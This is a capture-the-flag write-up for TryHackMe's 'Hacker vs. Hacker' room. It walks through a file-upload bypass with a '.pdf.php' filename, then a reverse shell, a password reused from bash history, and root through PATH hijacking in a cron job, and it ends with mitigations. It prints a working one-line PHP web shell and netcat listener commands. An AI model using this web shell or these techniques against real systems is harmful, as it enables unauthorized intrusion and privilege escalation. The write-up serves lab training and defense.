
# Hacker vs. Hacker — TryHackMe

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / Privilege Escalation

---

## Objective

The objective of this room was to obtain two flags:

- `user.txt`
- `root.txt`

The machine involved web application enumeration, an unrestricted file-upload vulnerability, initial access through a web shell, credential discovery, and Linux privilege escalation through a cron job and PATH hijacking.

---

# 1. Reconnaissance & Enumeration

After confirming that the target was reachable, I started with service enumeration using Nmap.

```bash
nmap -sC -sV -T4 <TARGET_IP> -oN nmap.txt
````

### Results

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 8.2p1|
|80/tcp|HTTP|Apache 2.4.41|

The scan showed two exposed services:

- **SSH (22)** — potential remote access
    
- **HTTP (80)** — web application and primary attack surface
    

Since HTTP was available, I investigated the web application first.

---

# 2. Web Application Enumeration

The website appeared to be an information-security recruitment application.

One of the available features allowed users to **upload a resume**.

Because file-upload functionality can introduce server-side file execution vulnerabilities, I inspected the application's source code and discovered an interesting reference to:

```text
upload.php
```

Further investigation showed that the application attempted to validate uploaded files using `strpos()`.

The validation was insufficient because it checked whether the filename contained an expected extension rather than enforcing a secure file type and extension.

For example:

```text
shell.pdf.php
```

could bypass the validation because the filename contained `.pdf` while still ending in `.php`.

---

# 3. Initial Access — Malicious File Upload

I created a PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

and saved it as:

```text
shell.pdf.php
```

The application allowed the file to be uploaded.

The source code also revealed that uploaded files were stored in:

```text
/cvs
```

Therefore, I was able to access the uploaded PHP file through:

```text
/cvs/shell.pdf.php
```

The successful response confirmed that PHP code execution was possible.

---

# 4. Web Shell → Reverse Shell

The web shell accepted commands through the `cmd` parameter.

I used it to establish a reverse shell back to my attacking machine.

Listener:

```bash
rlwrap nc -lnvp 9001
```

The resulting shell was obtained as:

```text
www-data
```

This gave me initial access to the target system.

---

# 5. User Enumeration

I inspected `/home` and discovered a user named:

```text
lachlan
```

I then examined the user's home directory:

```bash
ls -lha /home/lachlan
```

The directory contained:

```text
.bash_history
bin/
user.txt
```

The presence of `user.txt` confirmed that the first objective was accessible from the user's home directory.

---

# 6. Credential Discovery

The `.bash_history` file contained interesting commands:

```text
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "<password>" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

The history revealed that a password had previously been set for the `lachlan` account.

I used the discovered credentials to authenticate through SSH.

The session was being terminated shortly after login, so I investigated SSH session behaviour and used:

```bash
ssh -T lachlan@<TARGET_IP>
```

This provided a more persistent session for further enumeration.

---

# 7. Privilege Escalation Enumeration

While investigating the system, I found a custom cron configuration:

```bash
cat /etc/cron.d/persistence
```

The cron job was running as:

```text
root
```

An important section was:

```text
PATH=/home/lachlan/bin:/bin:/usr/bin
```

The cron commands used absolute paths for most binaries, but `pkill` was called without an absolute path:

```text
pkill -9 -t pts/$f
```

This was significant because:

1. The cron job executed as `root`.
    
2. `/home/lachlan/bin` appeared first in the `PATH`.
    
3. I had write access to `/home/lachlan/bin`.
    
4. `pkill` was executed without `/usr/bin/pkill`.
    
5. Therefore, a malicious executable named `pkill` placed in `/home/lachlan/bin` could be executed by the root cron job.
    

This created a **PATH hijacking vulnerability**.

---

# 8. PATH Hijacking

I created a malicious executable named:

```text
pkill
```

inside:

```text
/home/lachlan/bin/
```

The executable initiated a reverse shell to my attacking machine.

I then started a listener:

```bash
rlwrap nc -lnvp 4444
```

When the cron job executed, the malicious `pkill` was executed with root privileges.

The resulting shell was:

```text
root@b2r:~#
```

This confirmed successful privilege escalation to root.

---

# 9. Root Access

After obtaining root access, I verified the contents of the root directory:

```bash
ls
```

The directory contained:

```text
root.txt
```

The second flag was therefore obtained from:

```text
/root/root.txt
```

---

# 10. Attack Chain

```text
Nmap
  ↓
HTTP Enumeration
  ↓
Resume Upload Functionality
  ↓
Weak File Validation
  ↓
PHP File Upload
  ↓
Web Shell
  ↓
Reverse Shell as www-data
  ↓
User Enumeration
  ↓
Credential Discovery
  ↓
SSH Access as lachlan
  ↓
Cron Enumeration
  ↓
PATH Hijacking
  ↓
Malicious pkill
  ↓
Root Shell
  ↓
root.txt
```

---

# 11. Vulnerabilities Identified

### 1. Unrestricted / Weakly Validated File Upload

The application relied on insufficient filename validation.

An attacker could upload a PHP file disguised with an allowed extension.

**Impact:**

- Remote code execution
    
- Web shell deployment
    
- Server compromise
    

### 2. Sensitive Information in `.bash_history`

A user's shell history contained a password-setting command.

**Impact:**

- Credential disclosure
    
- User account compromise
    

### 3. Insecure Cron Configuration

A root cron job executed commands using a user-controlled directory in the `PATH`.

Additionally, `pkill` was called without an absolute path.

**Impact:**

- PATH hijacking
    
- Privilege escalation to root
    

---

# 12. Mitigation

### File Upload

- Allow only required file types.
    
- Validate MIME type and file content, not just filename extensions.
    
- Rename uploaded files to generated identifiers.
    
- Store uploads outside the web root.
    
- Disable script execution in upload directories.
    

### Credential Handling

- Never store passwords in shell history.
    
- Avoid exposing credentials through command history.
    
- Use secure credential-management practices.
    

### Cron / PATH Security

- Avoid user-writable directories in privileged `PATH` variables.
    
- Use absolute paths for executables in root cron jobs.
    

For example:

```text
/usr/bin/pkill
```

instead of:

```text
pkill
```

- Ensure privileged scripts and directories cannot be modified by unprivileged users.
    

---

# 13. Key Takeaways

- File-upload functionality should always be carefully investigated.
    
- Client-side or weak server-side filename validation can lead to code execution.
    
- Source-code comments and exposed files can reveal useful attack-surface information.
    
- `.bash_history` can contain sensitive information and should be treated carefully.
    
- Privilege escalation enumeration should include cron jobs and environment variables.
    
- A root process using a user-controlled `PATH` can create a PATH hijacking opportunity.
    
- When a privileged command is executed without an absolute path, investigate where the binary is resolved from.
    

---

## Tools Used

- Nmap
    
- Netcat
    
- SSH
    
- Linux command-line utilities
    
- Browser / source-code inspection
    

---

## Skills Demonstrated

- Network reconnaissance
    
- Service enumeration
    
- Web application enumeration
    
- File-upload vulnerability analysis
    
- PHP web-shell exploitation
    
- Reverse shell
    
- Linux user enumeration
    
- Credential discovery
    
- Cron enumeration
    
- PATH hijacking
    
- Linux privilege escalation
    